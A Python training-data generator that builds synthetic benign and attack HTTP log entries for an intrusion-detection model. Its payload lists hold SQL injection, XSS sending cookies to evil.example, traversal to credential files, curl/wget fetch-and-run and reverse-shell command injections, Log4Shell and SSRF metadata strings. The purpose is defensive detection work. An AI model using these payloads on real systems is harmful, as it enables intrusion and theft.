"""Synthetic traffic generator for bootstrap training.

Na primeira subida não existe tráfego real, e um detector que só começa a
funcionar depois de semanas de coleta não serve. Então geramos requisições
plausíveis — benignas e maliciosas — para treinar um modelo inicial. Ele é
deliberadamente mediano: o modelo bom vem do retreino com os eventos reais do
próprio ambiente (`app.ml.retrain`).

**O ponto crítico:** os exemplos aqui são ``LogEntry`` completos, que passam pelo
mesmo ``FeatureExtractor.build_vector`` usado na inferência. Gerar vetores de
features diretamente seria mais rápido e mais fácil — e introduziria exatamente a
divergência treino/inferência que ``features_spec`` existe para impedir.
"""

from __future__ import annotations

import random
from collections.abc import Callable
from datetime import UTC, datetime, timedelta

import numpy as np

from app.array_types import FloatArray, LabelArray
from app.pipeline.stage2_features import FeatureExtractor, WindowStats
from app.pipeline.types import LogEntry

# ---------------------------------------------------------------------------
# Vocabulário benigno
# ---------------------------------------------------------------------------

BENIGN_PATHS = [
    "/",
    "/index.html",
    "/sobre",
    "/contato",
    "/blog",
    "/blog/{slug}",
    "/produtos",
    "/produtos/{slug}",
    "/produtos/categoria/{slug}",
    "/api/v1/usuarios",
    "/api/v1/usuarios/{id}",
    "/api/v1/pedidos",
    "/api/v1/pedidos/{id}",
    "/api/v1/carrinho",
    "/api/v1/busca",
    "/static/css/main.{hash}.css",
    "/static/js/bundle.{hash}.js",
    "/static/img/logo.svg",
    "/media/produtos/{id}_800x600.webp",
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/health",
    "/login",
    "/logout",
    "/cadastro",
    "/minha-conta",
    "/checkout",
    # Fluxo de OAuth: carrega URL absoluta em parâmetro, o que aciona heurística
    # de SSRF. Precisa estar no conjunto benigno ou o modelo trata como incomum.
    "/oauth/authorize",
    "/oauth/callback",
    "/oauth/token",
    "/auth/callback",
]

BENIGN_SLUGS = [
    "notebook-gamer",
    "fone-bluetooth",
    "cadeira-ergonomica",
    "monitor-27",
    "teclado-mecanico",
    "como-escolher-um-notebook",
    "dicas-de-ergonomia",
    "eletronicos",
    "informatica",
    "moveis",
    "acessorios",
]

BENIGN_QUERIES = [
    "",
    "",
    "",
    "",  # a maioria das requisições não tem query
    "pagina={n}",
    "pagina={n}&por_pagina={n}",
    "ordenar=preco_asc",
    "q={termo}",
    "q={termo}&categoria={slug}",
    "filtro=cor:azul",
    "de=2026-01-01&ate=2026-08-06",
    "utm_source=google&utm_medium=cpc",
    "select=nome,email",
    "include=itens,pagamento",
    "limit=50&offset={n}",
    "env=prod&id={n}",
    "redirect_uri=https://app.exemplo.com/callback",
]

BENIGN_TERMS = ["notebook", "mouse sem fio", "cadeira", "monitor 4k", "ssd 1tb", "café"]

BENIGN_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"  # noqa: E501 (UA real, verbatim),
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"  # noqa: E501 (UA real, verbatim),
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"  # noqa: E501 (UA real, verbatim),
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"  # noqa: E501 (UA real, verbatim),
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"  # noqa: E501 (UA real, verbatim),
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

BENIGN_REFERERS = [
    # "-" é o que o nginx grava quando o cabeçalho não veio, e é a maioria dos
    # casos: cliente de API, bot e navegação direta não mandam Referer.
    "-",
    "-",
    "-",
    "",
    "https://www.google.com/",
    "https://loja.exemplo.com/",
    "https://loja.exemplo.com/produtos",
    "https://t.co/abc123",
    "/produtos",
]

# ---------------------------------------------------------------------------
# Cargas de ataque
# ---------------------------------------------------------------------------

SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1' OR 1=1--",
    "' UNION SELECT NULL,username,password FROM users--",
    "1; DROP TABLE usuarios--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT 1 FROM information_schema.tables)--",
    "-1 UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables",
    "1' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "admin'--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1 AND 1=1",
    "1' UNI/**/ON SEL/**/ECT senha FROM usuarios--",
    "1%27%20OR%20%271%27%3D%271",
    "1'; EXEC xp_cmdshell('whoami')--",
    "1' UNION SELECT CONCAT(usuario,0x3a,senha) FROM contas--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.domain)",
    "<iframe src=javascript:alert(1)>",
    "\"><script>fetch('//evil.example/'+document.cookie)</script>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    '<img src=1 href=1 onerror="javascript:alert(1)">',
    "data:text/html,<script>alert(1)</script>",
    "<marquee onstart=alert(1)>",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/shadow",
    "....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "../../../proc/self/environ",
    "..\\..\\..\\windows\\win.ini",
    "/var/www/../../etc/passwd",
    "....\\\\....\\\\boot.ini",
    "../.env",
    "../../.git/config",
    "../../../root/.ssh/id_rsa",
    "../../.aws/credentials",
]

CMDI_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(curl http://evil.example/s.sh)",
    "; wget http://evil.example/x.sh | sh",
    "&& cat /etc/shadow",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "| ls -la /",
    "; uname -a",
    "$(cat /etc/passwd)",
    "; ping -c 10 127.0.0.1",
    "|| id",
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "%0acat%20/etc/passwd",
]

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://evil.example/a}",
    "${jndi:rmi://evil.example:1099/obj}",
    "${jndi:dns://evil.example/x}",
    "${${lower:j}${lower:n}di:ldap://evil.example/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/z}",
    "${jndi:${lower:l}${lower:d}ap://evil.example/a}",
    "${env:AWS_SECRET_ACCESS_KEY}",
    "${jndi:ldaps://evil.example:1389/Basic/Command/Base64/d2hvYW1p}",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:8080/admin",
    "http://localhost:6379/",
    "http://10.0.0.1/internal",
    "http://192.168.1.1/",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stats",
    "file:///etc/passwd",
    "http://[::1]:8080/",
    "http://0.0.0.0:22/",
]

SCANNER_PATHS = [
    "/wp-admin/",
    "/wp-login.php",
    "/xmlrpc.php",
    "/phpmyadmin/",
    "/administrator/",
    "/admin.php",
    "/.env",
    "/.git/config",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/actuator/env",
    "/actuator/health",
    "/console",
    "/solr/admin/info/system",
    "/cgi-bin/test-cgi",
    "/shell.php",
    "/c99.php",
    "/wso.php",
    "/config.php.bak",
    "/backup.sql",
    "/.aws/credentials",
    "/server-status",
    "/autodiscover/autodiscover.xml",
    "/boaform/admin/formLogin",
    "/HNAP1/",
]

SCANNER_AGENTS = [
    "sqlmap/1.8#stable (https://sqlmap.org)",
    "Nikto/2.5.0",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "masscan/1.3",
    "gobuster/3.6",
    "ffuf/2.1.0",
    "WPScan v3.8.25",
    "Nuclei - Open-source",
    "python-requests/2.32.3",
    "curl/8.5.0",
    "Go-http-client/1.1",
    "",
]

INJECTION_PARAMS = ["id", "q", "busca", "user", "arquivo", "file", "page", "cmd", "url", "input"]
# Nomes de parametro que costumam receber URL — o alvo tipico de SSRF.
SSRF_PARAMS = ["url", "target", "fetch", "src", "callback"]

# Proporção da região de sobreposição entre as classes. Ver o comentário longo na
# seção "Casos difíceis" — sem isso o treino atinge F1 = 1.0 e o modelo não
# generaliza.
HARD_BENIGN_FRACTION = 0.25
STEALTHY_ATTACK_FRACTION = 0.15


def _pick(rng: random.Random, items: list[str]) -> str:
    return items[rng.randrange(len(items))]


def _fill(rng: random.Random, template: str) -> str:
    return (
        template.replace("{slug}", _pick(rng, BENIGN_SLUGS))
        .replace("{id}", str(rng.randint(1, 99999)))
        .replace("{n}", str(rng.randint(1, 100)))
        .replace("{hash}", f"{rng.randrange(16**8):08x}")
        .replace("{termo}", _pick(rng, BENIGN_TERMS).replace(" ", "%20"))
    )


def _timestamp(rng: random.Random) -> datetime:
    base = datetime(2026, 8, 6, tzinfo=UTC)
    # Tráfego humano pende para o horário comercial; bot distribui uniforme. A
    # feature de hora cíclica só aprende isso se a geração refletir a diferença.
    #
    # 55% e não 75%: com a concentração alta demais, qualquer tráfego legítimo de
    # madrugada — deploy, job noturno, usuário em outro fuso — virava anomalia
    # sozinho. Hora do dia é sinal fraco e o peso precisa refletir isso.
    business_hours = rng.random() < 0.55
    return base + timedelta(
        hours=rng.choice(
            [9, 10, 11, 12, 14, 15, 16, 17, 20, 21] if business_hours else list(range(24))
        ),
        minutes=rng.randrange(60),
        seconds=rng.randrange(60),
    )


# ---------------------------------------------------------------------------
# Geradores
# ---------------------------------------------------------------------------


def generate_benign(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    path = _fill(rng, _pick(rng, BENIGN_PATHS))
    query = _fill(rng, _pick(rng, BENIGN_QUERIES))

    # Erro NÃO é sinal de ataque por si só. Site real serve 404 de link quebrado o
    # dia inteiro, 401 de senha errada, 403 de sessão expirada. Um gerador que
    # produz quase só 200 ensina o modelo que qualquer erro é suspeito — e aí
    # `/login` devolvendo 401 vira alerta HIGH, que foi exatamente o que aconteceu
    # na primeira rodada de teste com tráfego real.
    status = rng.choices(
        [200, 301, 302, 304, 400, 401, 403, 404, 500],
        weights=[58, 5, 5, 8, 2, 7, 3, 10, 2],
    )[0]

    # Resposta de API é pequena — um JSON de confirmação tem dezenas de bytes, não
    # dezenas de KB. A faixa antiga (200 a 80.000) tratava isso como anômalo.
    if status in (204, 301, 302, 304, 401, 403):
        bytes_sent = rng.randint(0, 400)
    elif path.startswith("/api/"):
        bytes_sent = rng.randint(15, 6_000)
    else:
        bytes_sent = rng.randint(150, 80_000)

    entry = LogEntry(
        ts=_timestamp(rng),
        remote_addr=f"203.0.113.{rng.randint(1, 254)}",
        method=rng.choices(["GET", "GET", "GET", "POST", "HEAD"], weights=[70, 10, 5, 12, 3])[0],
        path=path,
        query=query,
        protocol=rng.choices(["HTTP/1.1", "HTTP/1.0", "HTTP/2.0"], weights=[80, 8, 12])[0],
        status=status,
        bytes_sent=bytes_sent,
        referer=_pick(rng, BENIGN_REFERERS),
        user_agent=_pick(rng, BENIGN_AGENTS),
        raw="",
    )

    # Navegação humana: poucas requisições, intervalos irregulares. Mas a taxa de
    # erro sobe até 1.0 numa fração dos casos — uma janela com uma requisição só,
    # e essa requisição sendo um 404, dá taxa de erro 1.0 sem nada de errado.
    error_rate = rng.uniform(0.5, 1.0) if rng.random() < 0.2 else rng.uniform(0.0, 0.25)
    window = WindowStats(
        request_count=rng.randint(1, 20),
        unique_paths=rng.randint(1, 12),
        error_rate=error_rate,
        mean_interarrival=rng.uniform(0.3, 30.0),
        burstiness=rng.uniform(0.1, 1.6),
    )
    return entry, window


# ---------------------------------------------------------------------------
# Casos difíceis
# ---------------------------------------------------------------------------
#
# Sem esta seção o treino atinge F1 = 1.0 — e isso não é um modelo bom, é um
# conjunto de dados ruim. Se benigno e ataque não se sobrepõem em lugar nenhum do
# espaço de features, qualquer classificador separa os dois, e o modelo aprende a
# fronteira do *gerador* em vez da fronteira do problema. Em produção, onde as
# distribuições se tocam, ele erra sem aviso.
#
# As duas listas abaixo criam essa sobreposição de propósito: tráfego legítimo que
# parece ataque, e ataque que parece legítimo.

# Requisições reais que acionam heurística de detecção sem serem ataque.
HARD_BENIGN_QUERIES = [
    # Alguém pesquisando documentação técnica.
    "q=como%20fazer%20union%20select%20no%20postgres",
    "q=diferen%C3%A7a%20entre%20union%20e%20union%20all",
    "q=erro%20drop%20table%20constraint",
    "q=%3Cscript%3E%20tag%20no%20html",
    "q=o%20que%20%C3%A9%20cross%20site%20scripting",
    # Caminho relativo legítimo em editor ou importador.
    "arquivo=../assets/imagens/logo.png",
    "import=../shared/config.json",
    # URL absoluta em parâmetro — OAuth, proxy de imagem, webhook.
    "redirect_uri=https://app.exemplo.com/oauth/callback&state=abc",
    "image_url=https://cdn.parceiro.com/foto.jpg",
    "callback=https://api.cliente.com/webhooks/pedido",
    # Parâmetros com nome igual a comando de shell.
    "env=producao&id=8821&ps=1&export=csv&dir=desc&rm=false",
    # Separadores que parecem shell mas são sintaxe de filtro.
    "filtro=categoria:eletronicos;marca:acme;preco:100-500",
    "campos=nome|email|telefone",
    # Conteúdo codificado legítimo.
    "payload=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZWRpdG9yIn0%3D",
    "assinatura=a3f5b8c9d2e1f4a7b6c5d8e9f0a1b2c3d4e5f6a7",
]

# Caminhos administrativos legítimos, acessados por quem tem acesso.
HARD_BENIGN_PATHS = [
    "/admin/pedidos",
    "/admin/usuarios",
    "/wp-admin/index.php",
    "/api/v1/admin/relatorios",
    "/actuator/health",
    "/metrics",
    "/backup/exportar",
    "/config/preferencias",
    "/.well-known/security.txt",
]


def generate_hard_benign(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    """Tráfego legítimo que se parece com ataque.

    Pesquisa por termos de SQL, caminho relativo real, URL em parâmetro, painel
    administrativo acessado por quem tem acesso, cliente de API com volume alto.
    """
    flavour = rng.random()

    if flavour < 0.45:
        path = _fill(rng, _pick(rng, ["/busca", "/api/v1/busca", "/blog/busca", "/docs"]))
        query = _pick(rng, HARD_BENIGN_QUERIES)
        status = rng.choice([200, 200, 200, 404])
    elif flavour < 0.7:
        # Administrador de verdade: autenticado, resposta 200, navegador comum.
        path, query = _pick(rng, HARD_BENIGN_PATHS), ""
        status = rng.choice([200, 200, 302])
    else:
        # Cliente de API ou crawler autorizado: volume alto, UA não-navegador,
        # mas tudo com 200 e em caminhos válidos.
        path = _fill(rng, _pick(rng, ["/api/v1/produtos", "/api/v1/pedidos", "/api/v1/estoque"]))
        query = _fill(rng, "pagina={n}&limit=100")
        status = 200

    high_volume = flavour >= 0.7
    return (
        LogEntry(
            ts=_timestamp(rng),
            remote_addr=f"203.0.113.{rng.randint(1, 254)}",
            method=rng.choice(["GET", "GET", "POST"]),
            path=path,
            query=query,
            protocol="HTTP/1.1",
            status=status,
            bytes_sent=rng.randint(500, 60_000),
            referer=_pick(rng, BENIGN_REFERERS),
            # Cliente de API legítimo usa exatamente os mesmos UAs que um scanner.
            user_agent=(
                rng.choice(["python-requests/2.32.3", "okhttp/4.12.0", "Go-http-client/1.1"])
                if high_volume
                else _pick(rng, BENIGN_AGENTS)
            ),
            raw="",
        ),
        WindowStats(
            request_count=rng.randint(60, 250) if high_volume else rng.randint(1, 15),
            unique_paths=rng.randint(20, 80) if high_volume else rng.randint(1, 10),
            error_rate=rng.uniform(0.0, 0.1),
            mean_interarrival=rng.uniform(0.05, 0.8) if high_volume else rng.uniform(2.0, 20.0),
            burstiness=rng.uniform(0.0, 0.5) if high_volume else rng.uniform(0.3, 1.3),
        ),
    )


def generate_stealthy_attack(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    """Ataque que evita as pistas óbvias.

    User-Agent de navegador, resposta 200, ritmo lento, carga mínima. É o
    atacante competente — e o caso em que o autoencoder ganha do Random Forest,
    porque a anomalia está na combinação e não em nenhum token isolado.
    """
    minimal_payloads = [
        "1'",
        '1"',
        "1)",
        "'||'",
        "1 or 1",
        "%27",
        "../",
        "<b>",
        "${x}",
        "|id",
        ";",
        "1 and 1",
        "/*",
        "0x27",
    ]
    return _attack_entry(
        rng,
        path=_fill(rng, _pick(rng, BENIGN_PATHS)),
        query=f"{_pick(rng, INJECTION_PARAMS)}={_pick(rng, minimal_payloads)}",
        status=rng.choice([200, 200, 302, 404]),
        # Navegador legítimo: a feature de scanner não dispara.
        agent=_pick(rng, BENIGN_AGENTS),
        # Devagar e espaçado: as features de janela não dispararam.
        window=WindowStats(
            request_count=rng.randint(1, 6),
            unique_paths=rng.randint(1, 5),
            error_rate=rng.uniform(0.0, 0.25),
            mean_interarrival=rng.uniform(5.0, 60.0),
            burstiness=rng.uniform(0.4, 1.5),
        ),
    )


def _attack_entry(
    rng: random.Random, path: str, query: str, *, status: int, agent: str, window: WindowStats
) -> tuple[LogEntry, WindowStats]:
    return (
        LogEntry(
            ts=_timestamp(rng),
            remote_addr=f"198.51.100.{rng.randint(1, 254)}",
            method=rng.choices(["GET", "POST"], weights=[75, 25])[0],
            path=path,
            query=query,
            protocol=rng.choices(["HTTP/1.1", "HTTP/1.0"], weights=[85, 15])[0],
            status=status,
            bytes_sent=rng.randint(0, 5000),
            referer="",
            user_agent=agent,
            raw="",
        ),
        window,
    )


def _probing_window(rng: random.Random) -> WindowStats:
    """Janela típica de quem está sondando: volume alto, muito erro, ritmo de script."""
    return WindowStats(
        request_count=rng.randint(20, 400),
        unique_paths=rng.randint(15, 350),
        error_rate=rng.uniform(0.5, 1.0),
        mean_interarrival=rng.uniform(0.01, 1.5),
        burstiness=rng.uniform(0.0, 0.6),
    )


def _injection_window(rng: random.Random) -> WindowStats:
    """Exploração dirigida costuma ser de baixo volume — o sinal está na carga."""
    return WindowStats(
        request_count=rng.randint(1, 40),
        unique_paths=rng.randint(1, 20),
        error_rate=rng.uniform(0.1, 0.8),
        mean_interarrival=rng.uniform(0.1, 10.0),
        burstiness=rng.uniform(0.0, 1.5),
    )


def generate_sqli(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    param = _pick(rng, INJECTION_PARAMS)
    return _attack_entry(
        rng,
        path=_fill(rng, _pick(rng, ["/produtos", "/api/v1/usuarios", "/busca", "/login"])),
        query=f"{param}={_pick(rng, SQLI_PAYLOADS)}",
        status=rng.choices([200, 500, 403, 404], weights=[35, 35, 20, 10])[0],
        agent=rng.choices(
            [_pick(rng, SCANNER_AGENTS), _pick(rng, BENIGN_AGENTS)], weights=[60, 40]
        )[0],
        window=_injection_window(rng),
    )


def generate_xss(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    param = _pick(rng, INJECTION_PARAMS)
    return _attack_entry(
        rng,
        path=_fill(rng, _pick(rng, ["/busca", "/comentarios", "/perfil", "/api/v1/busca"])),
        query=f"{param}={_pick(rng, XSS_PAYLOADS)}",
        status=rng.choices([200, 400, 403], weights=[60, 25, 15])[0],
        agent=rng.choices(
            [_pick(rng, SCANNER_AGENTS), _pick(rng, BENIGN_AGENTS)], weights=[50, 50]
        )[0],
        window=_injection_window(rng),
    )


def generate_traversal(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    payload = _pick(rng, TRAVERSAL_PAYLOADS)
    # Traversal aparece tanto no path quanto em parâmetro.
    if rng.random() < 0.5:
        path, query = f"/download/{payload}", ""
    else:
        path, query = "/download", f"{_pick(rng, ['arquivo', 'file', 'path', 'doc'])}={payload}"
    return _attack_entry(
        rng,
        path=path,
        query=query,
        status=rng.choices([404, 403, 200, 400], weights=[40, 30, 20, 10])[0],
        agent=rng.choices(
            [_pick(rng, SCANNER_AGENTS), _pick(rng, BENIGN_AGENTS)], weights=[65, 35]
        )[0],
        window=_injection_window(rng),
    )


def generate_cmdi(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    return _attack_entry(
        rng,
        path=_fill(
            rng, _pick(rng, ["/api/ping", "/tools/lookup", "/admin/exec", "/cgi-bin/status"])
        ),
        query=f"{_pick(rng, ['host', 'cmd', 'target', 'ip'])}=127.0.0.1{_pick(rng, CMDI_PAYLOADS)}",
        status=rng.choices([200, 500, 403], weights=[40, 40, 20])[0],
        agent=rng.choices(
            [_pick(rng, SCANNER_AGENTS), _pick(rng, BENIGN_AGENTS)], weights=[70, 30]
        )[0],
        window=_injection_window(rng),
    )


def generate_log4shell(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    payload = _pick(rng, LOG4SHELL_PAYLOADS)
    # A variante que mais aparece na prática vem em cabeçalho, não na URI.
    in_header = rng.random() < 0.6
    return _attack_entry(
        rng,
        path=_fill(rng, _pick(rng, BENIGN_PATHS)),
        query="" if in_header else f"x={payload}",
        status=rng.choices([200, 404, 400], weights=[60, 25, 15])[0],
        agent=payload if in_header else _pick(rng, BENIGN_AGENTS),
        window=_injection_window(rng),
    )


def generate_ssrf(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    return _attack_entry(
        rng,
        path=_fill(rng, _pick(rng, ["/api/fetch", "/proxy", "/api/v1/preview", "/render"])),
        query=f"{_pick(rng, SSRF_PARAMS)}={_pick(rng, SSRF_PAYLOADS)}",
        status=rng.choices([200, 500, 403, 502], weights=[35, 30, 20, 15])[0],
        agent=rng.choices(
            [_pick(rng, SCANNER_AGENTS), _pick(rng, BENIGN_AGENTS)], weights=[55, 45]
        )[0],
        window=_injection_window(rng),
    )


def generate_scanner(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    return _attack_entry(
        rng,
        path=_pick(rng, SCANNER_PATHS),
        query="",
        status=rng.choices([404, 403, 401, 200], weights=[55, 25, 12, 8])[0],
        agent=_pick(rng, SCANNER_AGENTS),
        window=_probing_window(rng),
    )


def generate_flood(rng: random.Random) -> tuple[LogEntry, WindowStats]:
    """Volume alto contra poucos caminhos — a carga é normal, o ritmo não."""
    return _attack_entry(
        rng,
        path=_fill(rng, _pick(rng, ["/login", "/api/v1/auth", "/checkout", "/"])),
        query=_fill(rng, _pick(rng, ["", "user=admin&pass={n}"])),
        status=rng.choices([401, 429, 200, 503], weights=[45, 25, 20, 10])[0],
        agent=rng.choices(
            [_pick(rng, SCANNER_AGENTS), _pick(rng, BENIGN_AGENTS)], weights=[60, 40]
        )[0],
        window=WindowStats(
            request_count=rng.randint(150, 500),
            unique_paths=rng.randint(1, 5),
            error_rate=rng.uniform(0.4, 0.95),
            mean_interarrival=rng.uniform(0.005, 0.3),
            burstiness=rng.uniform(0.0, 0.4),
        ),
    )


ATTACK_GENERATORS: dict[str, Callable[[random.Random], tuple[LogEntry, WindowStats]]] = {
    "sqli": generate_sqli,
    "xss": generate_xss,
    "traversal": generate_traversal,
    "cmdi": generate_cmdi,
    "log4shell": generate_log4shell,
    "ssrf": generate_ssrf,
    "scanner": generate_scanner,
    "flood": generate_flood,
}


def generate_dataset(
    n_samples: int, attack_ratio: float = 0.35, seed: int = 20260806
) -> tuple[FloatArray, LabelArray]:
    """Gera ``(X, y)`` com X de shape ``(n, 35)`` e y binário.

    ``attack_ratio`` em 0.35 e não em 0.5: tráfego real é majoritariamente
    benigno, e treinar em 50/50 produz um modelo com viés otimista que dispara
    demais em produção. Também não descemos a 1% (o valor realista), porque aí a
    classe positiva ficaria escassa demais para o Random Forest aprender.
    """
    rng = random.Random(seed)
    n_attacks = int(n_samples * attack_ratio)
    n_benign = n_samples - n_attacks

    vectors: list[list[float]] = []
    labels: list[int] = []

    # Um quarto dos benignos são casos difíceis, e um sexto dos ataques são
    # furtivos. É essa sobreposição que impede o modelo de aprender a fronteira
    # trivial do gerador em vez da fronteira do problema.
    n_hard_benign = int(n_benign * HARD_BENIGN_FRACTION)
    for index in range(n_benign):
        entry, window = generate_hard_benign(rng) if index < n_hard_benign else generate_benign(rng)
        vectors.append(FeatureExtractor.build_vector(entry, window, None))
        labels.append(0)

    categories = list(ATTACK_GENERATORS)
    n_stealthy = int(n_attacks * STEALTHY_ATTACK_FRACTION)
    for index in range(n_attacks):
        if index < n_stealthy:
            entry, window = generate_stealthy_attack(rng)
        else:
            # Round-robin em vez de sorteio: garante cobertura uniforme das
            # categorias mesmo com amostra pequena.
            entry, window = ATTACK_GENERATORS[categories[index % len(categories)]](rng)
        country = rng.choice([None, "CN", "RU", "US", "NL", "BR"])
        vectors.append(FeatureExtractor.build_vector(entry, window, country))
        labels.append(1)

    X = np.asarray(vectors, dtype=np.float32)
    y = np.asarray(labels, dtype=np.int64)

    order = np.random.default_rng(seed).permutation(len(y))
    return X[order], y[order]


def generate_labelled_entries(
    n_samples: int, seed: int = 20260806
) -> list[tuple[LogEntry, WindowStats, int]]:
    """Mesma geração, mas devolvendo as entradas — usado nos testes ponta a ponta."""
    rng = random.Random(seed)
    result: list[tuple[LogEntry, WindowStats, int]] = []
    categories = list(ATTACK_GENERATORS)
    for index in range(n_samples):
        if index % 3 == 0:
            entry, window = ATTACK_GENERATORS[categories[index % len(categories)]](rng)
            result.append((entry, window, 1))
        else:
            entry, window = generate_benign(rng)
            result.append((entry, window, 0))
    return result
